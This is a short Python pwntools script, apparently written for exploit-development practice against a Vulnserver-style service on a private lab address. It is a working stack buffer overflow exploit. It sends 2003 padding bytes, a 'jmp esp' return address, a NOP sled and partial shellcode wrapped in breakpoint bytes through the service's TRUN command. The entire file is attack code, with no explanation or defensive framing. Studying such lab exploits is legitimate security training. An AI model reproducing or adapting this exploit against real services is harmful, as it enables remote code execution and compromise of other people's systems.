#!/usr/bin/env python3

from pwn import *


padding = b'\x41' * 2003
nops =    b'\x90' * 64

shellcode = b'\x89\xe5f\x83\xec`1\xc0PhcessheProhinathTerm\x89\xe61\xc0\x99\xfc\xac\x84\xc0t\x07\xc1\xca\r\x01\xc2\xeb\xf4'
shellcode = b'\xcc' + shellcode + b'\xcc'

payload = flat(
    padding,
    p32(0x625011af), # jmp esp;
    nops, shellcode
)

with remote('192.168.122.46', 9999) as r:
    r.writeline(b'TRUN /.:/%s' % payload)

